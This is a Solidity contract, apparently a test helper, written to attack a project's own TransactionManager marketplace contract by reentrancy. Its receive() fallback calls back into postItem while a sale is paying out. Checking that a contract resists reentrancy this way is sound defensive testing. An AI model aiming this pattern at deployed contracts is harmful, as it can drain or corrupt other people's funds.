// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {TransactionManager} from "../../src/TransactionManager.sol";

contract ReEntrancyAttacker {
    TransactionManager tmgr;
    constructor(TransactionManager _tmgr) {
        tmgr = _tmgr;
    }

    function attack() public payable {
        tmgr.sellItem(1);
    }

    function post() public payable {
        tmgr.registerUser();
        tmgr.postItem(0, "Tomato", 1 ether, true);
    }

    function viewAttackerBalance() public payable returns (uint256) {
        return tmgr.viewBalance();
    }

    receive() external payable {
        tmgr.postItem(1, "Tomato", 1 ether, true);
    }
}
